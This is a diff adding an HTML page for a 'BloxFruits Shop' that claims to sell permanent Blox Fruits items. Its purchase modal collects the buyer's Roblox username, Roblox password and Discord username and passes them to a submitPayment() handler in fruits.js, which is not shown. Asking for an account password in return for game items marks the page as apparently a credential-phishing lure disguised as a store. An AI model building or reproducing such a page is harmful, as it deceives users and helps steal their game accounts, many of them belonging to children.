@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Permanent Fruits Buying - BloxFruits Shop</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="fruits.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Welcome to BloxFruits Shop</h1>
+            <img src="logo.png" alt="BloxFruits Shop Logo" class="logo">
+        </header>
+        <nav class="navigation">
+            <ul>
+                <li><a href="aboutus.html" id="about-link">About Us</a></li>
+                <li><a href="services.html" id="services-link">Our Services</a></li>
+                <li><a href="fruits.html" id="fruits-link">Permanent Fruits</a></li>
+            </ul>
+        </nav>
+    </div>
+
+    <section class="fruits">
+        <div class="container">
+            <h2>Permanent Fruits Buying</h2>
+            <div class="fruit-buy-panel">
+                <div class="fruit-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259138257573253192/1259138354369265685/image.png?ex=668a9779&is=668945f9&hm=afba97aa4c411fcc82c771f7b63eb8e04884eefdc482836d49186b90ce261c72" alt="Permanent Fruit 1">
+                </div>
+                <div class="fruit-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259138257573253192/1259138428923281428/image.png?ex=668a978b&is=6689460b&hm=97a55ff0668c914d2c362d89874ed5838bed9c8beb997f46b98f47ebc36979d2" alt="Permanent Fruit 2">
+                </div>
+                <div class="fruit-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259138257573253192/1259138520677875772/image.png?ex=668a97a0&is=66894620&hm=0b1e0092866e97f980fdb50d8dd61ec412d8c18676bdbec32546cb2475f3aca6" alt="Permanent Fruit 3">
+                </div>
+                <div class="fruit-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259138257573253192/1259138681873109022/image.png?ex=668a97c7&is=66894647&hm=49ba0bde596eb799295e6d1d62dee6b5756584fcc19a680bcccf05c11e4de030" alt="Permanent Fruit 4">
+                </div>
+                <div class="fruit-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259138257573253192/1259139471996096512/image.png?ex=668a9883&is=66894703&hm=f4e9f0fa4927c9385204645e18c4c81f2ea4c492b971ce23c19fc5042f39b2d6" alt="Permanent Fruit 5">
+                </div>
+                <div class="fruit-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259138257573253192/1259139578879545405/image.png?ex=668a989d&is=6689471d&hm=3f6211b78b0a5bb1a17b38463f741ee10e08cce1ea571a243c2048b032f92ebf" alt="Permanent Fruit 6">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="buy-section">
+        <button class="buy-button" onclick="openModal()">Buy</button>
+    </div>
+
+    <!-- Modal HTML -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <img id="modalImage" src="" alt="Fruit Image">
+            <h2 id="modalTitle">Selected Fruit</h2>
+            <p id="modalDescription">Enter your details to proceed with the purchase:</p>
+            
+            <!-- Form for Roblox username, password, and Discord -->
+            <div class="input-group">
+                <label for="robloxUsername">Roblox Username:</label>
+                <input type="text" id="robloxUsername" required>
+            </div>
+            <div class="input-group">
+                <label for="robloxPassword">Roblox Password:</label>
+                <input type="password" id="robloxPassword" required>
+            </div>
+            <div class="input-group">
+                <label for="discordUsername">Discord Username:</label>
+                <input type="text" id="discordUsername" required>
+            </div>
+            
+            <label for="amount" id="amountLabel">Fruit ($):</label>
+            <input type="text" id="amount" class="amount-input" required>
+            <br><br>
+            <button class="buy-button" onclick="submitPayment()">Submit</button>
+        </div>
+    </div>
+
+    <script src="fruits.js"></script>
+</body>
+</html>
